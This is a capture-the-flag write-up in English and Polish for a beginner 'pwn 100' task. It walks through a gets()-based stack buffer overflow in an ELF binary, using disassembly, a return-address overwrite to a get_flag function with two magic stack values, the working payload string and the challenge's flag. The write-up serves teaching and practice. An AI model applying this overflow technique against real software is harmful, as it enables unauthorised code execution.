# Get started (pwn 100)

###ENG
[PL](#pl-version)

In the task we get an ELF [binary](get_started) to work with.
Ret-dec results are:

```c
int main(int argc, char ** argv) {
    printf("Qual a palavrinha magica? ");
    int32_t str;
    gets((char *)&str);
    return 0;
}
```

So not much code is executed, but we can see that there is a blatant stack buffer overflow.
The task description hints that we don't need to get a shell here, everything is in the binary.
So we look at the disassembly and in fact there is:

```asm
; function: get_flag at 0x80489a0 -- 0x8048a1f
0x80489a0:   56                                 	push esi
0x80489a1:   83 ec 08                           	sub esp, 0x8
0x80489a4:   81 7c 24 10 4f d6 8c 30            	cmp dword [ esp + 0x10 ], 0x308cd64f
0x80489ac:   75 67                              	jnz 0x8048a15 <get_flag+0x75>
0x80489ae:   81 7c 24 14 d1 19 57 19            	cmp dword [ esp + 0x14 ], 0x195719d1
0x80489b6:   75 5d                              	jnz 0x8048a15 <get_flag+0x75>
0x80489b8:   c7 44 24 04 68 dd 0c 08            	mov dword [ esp + 0x4 ], 0x80cdd68 ; "rt"
0x80489c0:   c7 04 24 88 c3 0b 08               	mov dword [ esp ], 0x80bc388 ; "flag.txt"
0x80489c7:   e8 44 6c 00 00                     	call 0x804f610 <fopen>
0x80489cc:   89 c6                              	mov esi, eax
0x80489ce:   89 34 24                           	mov dword [ esp ], esi
0x80489d1:   e8 8a 87 00 00                     	call 0x8051160 <fgetc>
0x80489d6:   0f b6 c8                           	movzx ecx, al
0x80489d9:   81 f9 ff 00 00 00                  	cmp ecx, 0xff
0x80489df:   74 2c                              	jz 0x8048a0d <get_flag+0x6d>
0x80489e1:   0f be c8                           	movsx ecx, al
0x80489e4:   66                                 	
0x80489e5:   66                                 	
0x80489e6:   66                                 	
0x80489e7:   2e                                 	
0x80489e8:   0f 1f 84 00 00 00 00 00            	nop dword [ eax + eax * 0x0 + 0x0 ]
0x80489f0:   89 0c 24                           	mov dword [ esp ], ecx
0x80489f3:   e8 a8 6d 00 00                     	call 0x804f7a0 <putchar>
0x80489f8:   89 34 24                           	mov dword [ esp ], esi
0x80489fb:   e8 60 87 00 00                     	call 0x8051160 <fgetc>
0x8048a00:   0f be c8                           	movsx ecx, al
0x8048a03:   0f b6 c0                           	movzx eax, al
0x8048a06:   3d ff 00 00 00                     	cmp eax, 0xff
0x8048a0b:   75 e3                              	jnz 0x80489f0 <get_flag+0x50>
0x8048a0d:   89 34 24                           	mov dword [ esp ], esi
0x8048a10:   e8 bb 67 00 00                     	call 0x804f1d0 <fclose>
0x8048a15:   83 c4 08                           	add esp, 0x8
0x8048a18:   5e                                 	pop esi
0x8048a19:   c3                                 	ret
0x8048a1a:   66                                 	
0x8048a1b:   0f 1f 44 00 00                     	nop dword [ eax + eax * 0x0 + 0x0 ]
```

So we actually already have there a function which will read and print a flag if called.
`Checksec` tells us there are no canaries, so we should be able to use buffer overflow in order to overwrite return address from `main()` and jump to `get_flag` function.

Looking at `main` in assembly shows:

```asm
; function: main at 0x8048a20 -- 0x8048a4f
0x8048a20:   83 ec 3c                           	sub esp, 0x3c
0x8048a23:   c7 04 24 91 c3 0b 08               	mov dword [ esp ], 0x80bc391 ; "Qual a palavrinha magica? "
0x8048a2a:   e8 b1 66 00 00                     	call 0x804f0e0 <printf>
0x8048a2f:   8d 44 24 04                        	lea eax, dword [ esp + 0x4 ]
0x8048a33:   89 04 24                           	mov dword [ esp ], eax
0x8048a36:   e8 f5 6b 00 00                     	call 0x804f630 <function_804f630>
0x8048a3b:   31 c0                              	xor eax, eax
0x8048a3d:   83 c4 3c                           	add esp, 0x3c
0x8048a40:   c3                                 	ret
```

So we can see that stack frame was created with `sub esp, 0x3c` and therefore there are 60 bytes of stack allocated.
4 bytes go for the return address, so we need to overflow 56 bytes in order to get to the return pointer.

We want to change the pointer for address `0x80489a0` which is the start of `get_flag` function.
So the necessary payload is:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)`

Keep in mind the reversed byte order for the addresses!
But this is not enough yet.
In the `get_flag` code there is:

```asm
0x80489a4:   81 7c 24 10 4f d6 8c 30            	cmp dword [ esp + 0x10 ], 0x308cd64f
0x80489ac:   75 67                              	jnz 0x8048a15 <get_flag+0x75>
0x80489ae:   81 7c 24 14 d1 19 57 19            	cmp dword [ esp + 0x14 ], 0x195719d1
0x80489b6:   75 5d                              	jnz 0x8048a15 <get_flag+0x75>
```

Suffice to say that if we take any of those 2 jumps the application will not read the flag for us.
So we have to make sure that those stack variables carry those specified values.

With the debugger we can quickly calculate that first of those values at `esp + 0x10` is just 4 bytes above the return pointer we just substituted, so we need to extend our payload to:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)+"a"*4+chr(0x4f)+chr(0xd6)+chr(0x8c)+chr(0x30)`

to skip the first check.
The next one is at `esp + 0x14` so simply the next 4 bytes, and therefore the final payload requires:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)+"a"*4+chr(0x4f)+chr(0xd6)+chr(0x8c)+chr(0x30)+""+chr(0xd1)+chr(0x19)+chr(0x57)+chr(0x19)`

Using the payload we get the flag: `3DS{b0f_pr4_c0m3c4r_n3}`

###PL version

W zadaniu dostajemy ELFową [binarke](get_started).
Wyniki ret-dec:

```c
int main(int argc, char ** argv) {
    printf("Qual a palavrinha magica? ");
    int32_t str;
    gets((char *)&str);
    return 0;
}
```

Niewiele wykonywanego kodu, ale widzimy że jest tam ewidentny stack buffer overflow.
Zadanie hintuje, że nie trzeba tu zdobywać shella bo wszystko jest już w binarce.
Więc zaglądamy do deasemblera a tam faktycznie:

```asm
; function: get_flag at 0x80489a0 -- 0x8048a1f
0x80489a0:   56                                 	push esi
0x80489a1:   83 ec 08                           	sub esp, 0x8
0x80489a4:   81 7c 24 10 4f d6 8c 30            	cmp dword [ esp + 0x10 ], 0x308cd64f
0x80489ac:   75 67                              	jnz 0x8048a15 <get_flag+0x75>
0x80489ae:   81 7c 24 14 d1 19 57 19            	cmp dword [ esp + 0x14 ], 0x195719d1
0x80489b6:   75 5d                              	jnz 0x8048a15 <get_flag+0x75>
0x80489b8:   c7 44 24 04 68 dd 0c 08            	mov dword [ esp + 0x4 ], 0x80cdd68 ; "rt"
0x80489c0:   c7 04 24 88 c3 0b 08               	mov dword [ esp ], 0x80bc388 ; "flag.txt"
0x80489c7:   e8 44 6c 00 00                     	call 0x804f610 <fopen>
0x80489cc:   89 c6                              	mov esi, eax
0x80489ce:   89 34 24                           	mov dword [ esp ], esi
0x80489d1:   e8 8a 87 00 00                     	call 0x8051160 <fgetc>
0x80489d6:   0f b6 c8                           	movzx ecx, al
0x80489d9:   81 f9 ff 00 00 00                  	cmp ecx, 0xff
0x80489df:   74 2c                              	jz 0x8048a0d <get_flag+0x6d>
0x80489e1:   0f be c8                           	movsx ecx, al
0x80489e4:   66                                 	
0x80489e5:   66                                 	
0x80489e6:   66                                 	
0x80489e7:   2e                                 	
0x80489e8:   0f 1f 84 00 00 00 00 00            	nop dword [ eax + eax * 0x0 + 0x0 ]
0x80489f0:   89 0c 24                           	mov dword [ esp ], ecx
0x80489f3:   e8 a8 6d 00 00                     	call 0x804f7a0 <putchar>
0x80489f8:   89 34 24                           	mov dword [ esp ], esi
0x80489fb:   e8 60 87 00 00                     	call 0x8051160 <fgetc>
0x8048a00:   0f be c8                           	movsx ecx, al
0x8048a03:   0f b6 c0                           	movzx eax, al
0x8048a06:   3d ff 00 00 00                     	cmp eax, 0xff
0x8048a0b:   75 e3                              	jnz 0x80489f0 <get_flag+0x50>
0x8048a0d:   89 34 24                           	mov dword [ esp ], esi
0x8048a10:   e8 bb 67 00 00                     	call 0x804f1d0 <fclose>
0x8048a15:   83 c4 08                           	add esp, 0x8
0x8048a18:   5e                                 	pop esi
0x8048a19:   c3                                 	ret
0x8048a1a:   66                                 	
0x8048a1b:   0f 1f 44 00 00                     	nop dword [ eax + eax * 0x0 + 0x0 ]
```

Więc faktycznie jest tu funkcja czytająca i wypisująca flagę.
`Checksec` mówi że nie ma na stosie kanarków, więc możemy bez problemów przepełnić bufor na stosie aby nadpisać adres powrotu z funkcji `main()` i skoczyć do funkcji `get_flag`.

Jeśli popatrzymy na disasm funkcji main, zobaczymy:

```asm
; function: main at 0x8048a20 -- 0x8048a4f
0x8048a20:   83 ec 3c                           	sub esp, 0x3c
0x8048a23:   c7 04 24 91 c3 0b 08               	mov dword [ esp ], 0x80bc391 ; "Qual a palavrinha magica? "
0x8048a2a:   e8 b1 66 00 00                     	call 0x804f0e0 <printf>
0x8048a2f:   8d 44 24 04                        	lea eax, dword [ esp + 0x4 ]
0x8048a33:   89 04 24                           	mov dword [ esp ], eax
0x8048a36:   e8 f5 6b 00 00                     	call 0x804f630 <function_804f630>
0x8048a3b:   31 c0                              	xor eax, eax
0x8048a3d:   83 c4 3c                           	add esp, 0x3c
0x8048a40:   c3                                 	ret
```

Więc widać że ramka stosu została utworzona przez `sub esp, 0x3c` a więc zaalokowano 60 bajtów na stosie.
4 potrzebne są na adres powrotu, więc musimy przepełnić bufor o 56 bajtów żeby dokopać się do adresu powrotu.

Chcemy zmienić ten adres na `0x80489a0`, czyli na początek funkcji `get_flag`.
To oznacza że potrzebny payload to:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)`

Pamiętajmy o odwrotnej kolejności bajtów w adresach!
Ale to jeszcze nie wszystko.
W kodzie `get_flag` mamy:

```asm
0x80489a4:   81 7c 24 10 4f d6 8c 30            	cmp dword [ esp + 0x10 ], 0x308cd64f
0x80489ac:   75 67                              	jnz 0x8048a15 <get_flag+0x75>
0x80489ae:   81 7c 24 14 d1 19 57 19            	cmp dword [ esp + 0x14 ], 0x195719d1
0x80489b6:   75 5d                              	jnz 0x8048a15 <get_flag+0x75>
```

Jeśli wykonamy którykolwiek z tych 2 skoków flaga nie zostanie odczytana i wypisana.
Musimy więc tak ustawić zmienne na stosie, żeby ominąć te dwa warunki.

Za pomocą debuggera możemy szybko wyliczyć że pierwsza wartość z `esp + 0x10` jest tylko 4 bajty powyżej adresu powrotu z main który nadpisaliśmy, więc potrzebujemy rozszerzyć nasz payload do:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)+"a"*4+chr(0x4f)+chr(0xd6)+chr(0x8c)+chr(0x30)`

aby ominąć pierwszy warunek.
Druga zmienna jest pod `esp + 0x14` więc to po prostu kolejne 4 bajty, więc payload rozszerzamy do:

`("a"*56)+chr(0xa0)+chr(0x89)+chr(0x04)+chr(0x08)+"a"*4+chr(0x4f)+chr(0xd6)+chr(0x8c)+chr(0x30)+""+chr(0xd1)+chr(0x19)+chr(0x57)+chr(0x19)`

Wysyłając taki zestaw danych dostajemy: `3DS{b0f_pr4_c0m3c4r_n3}`
